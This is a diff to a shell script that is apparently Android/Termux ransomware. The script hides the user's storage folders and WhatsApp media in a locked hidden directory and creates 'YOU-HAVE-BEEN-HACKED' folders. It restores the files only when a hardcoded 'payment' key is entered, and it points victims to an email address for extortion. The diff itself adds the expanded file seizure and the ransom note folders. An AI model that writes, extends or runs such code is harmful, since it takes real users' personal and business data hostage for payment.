@@ -1,8 +1,36 @@
 mkdir /$HOME/.rfkzk
-mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
-mv /sdcard/Android/media/com.whatsapp.w4b/'Whatsapp Business' /data/data/com.termux/files/home/.rfkzk
+find /sdcard -mindepth 1 -maxdepth 1 -type d ! -name 'Android' -exec mv -t /$HOME/.rfkzk {} +
+if [ -d "/sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business'" ]
+then
+	mv /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business' /data/data/com.termux/files/home/.rfkzk
+else
+	echo "nothingtodo"
+ 	sleep 2
+fi
+if [ -d "/sdcard/Android/media/com.whatsapp/'WhatsApp'" ]
+then
+	mv /sdcard/Android/media/com.whatsapp/'WhatsApp' /data/data/com.termux/files/home/.rfkzk
+else
+	echo "nothingtodo"
+ 	sleep 2
+fi
 chmod u=w /$HOME/.rfkzk
-mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂y
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂t
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂r
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂e
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂w
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂q
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂0
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂9
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂8
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂7
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂6
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂5
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂4
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂3
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂2
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂1
 chmod u=x *
 chmod u=rx install.sh
 clear
@@ -25,10 +53,38 @@ do
 	if [ "$key" == "HoigIgDyufydUd3a%e7t*g9h9hs2g9sgi29hs1oh1ss1s19h" ]
 	then
 		echo -e "\033[0;49;92m THANK YOU FOR YOUR PAYMENT!\033[m"
-		echo -e "\033[0;49;95m Please Check Your Gallery!"
+		echo -e "\033[0;49;95m Reverting the Virus...\033[m"
+  		sleep 2
 		chmod u=rwx /$HOME/.rfkzk
-		mv /$HOME/.rfkzk/* /sdcard
-  		mv /data/data/com.termux/files/home/.rfkzk/'Whatsapp Business' /sdcard/Android/media/com.whatsapp.w4b/
+  		if [ -d "/sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business'" ]
+		then
+			mv /data/data/com.termux/files/home/.rfkzk/'WhatsApp Business' /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business'
+		else
+			echo "nothingtodo"
+		fi
+		if [ -d "/sdcard/Android/media/com.whatsapp/'WhatsApp'" ]
+		then
+			mv /data/data/com.termux/files/home/.rfkzk/'WhatsApp' /sdcard/Android/media/com.whatsapp/'WhatsApp'
+		else
+			echo "nothingtodo"
+		fi
+  		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂y
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂t
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂r
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂e
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂w
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂q
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂0
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂9
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂8
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂7
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂6
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂5
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂4
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂3
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂2
+		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂1
+  		mv /$HOME/.rfkzk/* /sdcard/
 		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
 		break
 	elif [ "$key" == "info" ]
@@ -36,13 +92,11 @@ do
 		clear
 		echo -e "\033[0;49;92m Whats happens with my files?\033[m"
 		echo ""
-		echo "Your files are been confiscated"
-		echo "by a malicious script that steal your files"
+		echo "Your files are been confiscated by a malicious script that steal your files, including your social media files, or bussiness..."
 		echo ""
 		echo -e "\033[0;49;92m What i can do?\033[m"
 		echo ""
-		echo -e "You can send me a message in\033[0;49;91m macksoupletter@gmail.com\033[m"
-		echo "and us can solve your problem."
+		echo -e "You can send me a message in\033[0;49;91m macksoupletter@gmail.com\033[m and we can solve your issue..."
 		echo ""
 		read -p "press enter to back"
 	else
